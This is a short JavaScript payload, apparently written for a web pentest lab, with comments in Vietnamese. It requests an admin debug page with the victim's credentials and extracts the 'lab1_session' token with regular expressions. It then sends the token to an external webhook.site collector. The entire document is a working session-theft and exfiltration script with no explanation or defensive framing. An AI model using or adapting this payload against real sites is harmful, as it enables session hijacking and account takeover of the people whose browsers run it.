fetch('https://lab1.demo-pentest.pp.ua/admin/debug', {credentials:'include'})
.then(r => r.text())
.then(html => {
    // Pattern CHẶT - tìm lab1_session = "..." hoặc lab1_session: "..."
    let sessionMatch = html.match(/lab1_session\s*=\s*["']([^"']+)["']/i);
    
    // Fallback nếu không tìm thấy pattern có dấu ngoặc
    if (!sessionMatch) {
        sessionMatch = html.match(/lab1_session[:\s]+([a-f0-9]{32,})/i);
    }
    
    if (sessionMatch) {
        const sessionValue = sessionMatch[1] || sessionMatch[0];
        
        fetch('https://webhook.site/35072877-3640-41da-b949-6eb069d6e53c', {
            method: 'POST',
            mode: 'no-cors',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session: sessionValue})
        });
    }
})
